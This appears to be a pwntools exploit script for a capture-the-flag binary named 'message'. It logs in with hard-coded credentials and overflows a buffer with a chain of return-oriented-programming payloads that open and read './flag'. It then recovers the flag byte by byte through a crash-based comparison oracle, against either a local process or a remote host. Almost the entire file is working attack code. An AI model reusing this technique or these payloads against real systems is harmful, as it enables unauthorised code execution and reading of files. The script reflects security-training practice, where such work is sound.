#-*- coding: utf-8 -*-
from pwn import *
import time


__author__ = '3summer'
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
irt     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))

binary_file = './message'
context.binary = binary_file
context.terminal = ['tmux', 'sp', '-h', '-l', '110']
# context.log_level = 'debug'
context.log_level = 'error'
# dic = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}'
dic = r'abcdefghijklmnopqrstuvwxyz{}'

def dbg(breakpoint):
    glibc_dir = '/usr/src/glibc/glibc-2.23/'
    gdbscript = 'directory %smalloc\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdbscript += 'c\n'
    log.info(gdbscript)
    gdb.attach(io, gdbscript)
    time.sleep(1)

def choice(cmd, *argv):
    sla(':',cmd)
    for i in argv:
        if isinstance(i,tuple):
            sa(':',i[0])
            continue
        sla(':',i)
add     = lambda size,content       :choice(1,size,(content,))
edit    = lambda idx,size,content   :choice(2,idx,size,(content,))
show    = lambda idx                :choice(3,idx)
delete  = lambda idx                :choice(4,idx)


def exploit(io,i,j):
    # dbg(0x400A5E)
    # dbg(0x400b07)
    # dbg(0x400a32)
    # dbg(0x400a68)
    pop_rdi = 0x0000000000400e13# : pop rdi ; ret
    write = 0x40091C
    read = 0x400A46
    syscall = 0x0000000000400a32
    mov_eax =  0x00000000004007a6#  : mov eax, edi ; mov ecx, esi ; ror eax, cl ; ret
    pop_rsi_r15 = 0x0000000000400e11# : pop rsi ; pop r15 ; ret
    pop_rsp = 0x00000000004008f4# : pop rsp ; ret
    cmp_jge = 0x400A68 # cmp     al, [rdi]; jge     short sub_400A24;retn;

    
    sla('quit',0)
    sla(':','root')
    sla(':','youknowtoomuch')
    sla('quit',3)
    payload = flat('a'*40,pop_rdi, 0x602170, read, pop_rdi, 2, pop_rsi_r15,0,0,mov_eax,pop_rsp,0x602170+8)
    payload = payload.ljust(0x80,'\x90')
    sa('message', payload)
    payload1 = flat('./flag\x00\x00',pop_rdi,0x602170,syscall,pop_rdi,0x602170+0x100,read,pop_rsp,0x602170+0x100,pop_rdi,0x602170+0x200,read,pop_rsp,0x602170+0x200)
    payload1 = payload1.ljust(0x80,'\x90')
    s(payload1)
    payload2 = flat(pop_rdi, 0, pop_rsi_r15,0,0,mov_eax,pop_rdi,3,pop_rsi_r15,0x602170+0x500,0,syscall,pop_rsp,0x602170+0x48)
    payload2 = payload2.ljust(0x80,'\x90')
    s(payload2)
    payload3 = flat(pop_rdi, ord(dic[i]), pop_rsi_r15,0,0,mov_eax, pop_rdi, 0x602170+0x500+j,cmp_jge, pop_rdi, 0x400705, mov_eax, 0x400705)
    payload3 = payload3.ljust(0x80,'\x90')
    #raw_input()
    s(payload3)
    print dic[i]
    # io.interactive()
    try:
        #time.sleep(1)
        io.recv()
        io.recv(timeout=1)
        #s('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        #s('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        #s('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        #('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    except EOFError:
        return io,dic[i]

    # raw_input()
    return io,0


if __name__ == '__main__':
    i=-1
    j=0
    flag = ''
    while True:
        i += 1
        # time.sleep(1)
        if len(sys.argv) > 1:
            io = remote(sys.argv[1], sys.argv[2])
        else:
            io = process(binary_file, 0)
        io,c =exploit(io,i,j)
        if c:
            flag += c
            print 'pos %d found: %c'%(j,c)
            print 'current flag',flag
            # raw_input()
            i=-1
            j+=1
        io.close()
    # irt()

